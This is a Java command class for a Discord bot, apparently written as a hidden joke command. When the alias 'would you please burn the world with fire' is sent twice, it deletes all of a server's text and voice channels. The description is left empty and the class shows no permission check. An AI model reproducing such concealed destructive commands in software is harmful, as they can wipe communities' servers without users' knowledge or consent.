package tech.hadenw.shmamesbot.commands;

import net.dv8tion.jda.core.entities.Game;
import net.dv8tion.jda.core.entities.Game.GameType;
import net.dv8tion.jda.core.entities.Message;
import net.dv8tion.jda.core.entities.TextChannel;
import net.dv8tion.jda.core.entities.User;
import net.dv8tion.jda.core.entities.VoiceChannel;
import tech.hadenw.shmamesbot.Shmames;

public class Armageddon implements ICommand {
	private boolean isPrimed;
	
	public Armageddon() {
		isPrimed = false;
	}
	
	@Override
	public String getDescription() {
		isPrimed = false;
		return "";
	}

	@Override
	public String run(String args, User author, Message message) {
		if(isPrimed) {
			for (TextChannel c : message.getGuild().getTextChannels()) {
				c.delete().queue();
			}

			for (VoiceChannel c : message.getGuild().getVoiceChannels()) {
				c.delete().queue();
			}

			isPrimed = false;
			
			Shmames.getJDA().getPresence().setGame(Game.of(GameType.WATCHING, "the world burn"));
		} else {
			isPrimed = true;
		}
		
		return null;
	}

	@Override
	public String[] getAliases() {
		return new String[] {"would you please burn the world with fire"};
	}
	
	@Override
	public String sanitize(String i) {
		return i;
	}
	
	@Override
	public boolean requiresGuild() {
		return true;
	}
}
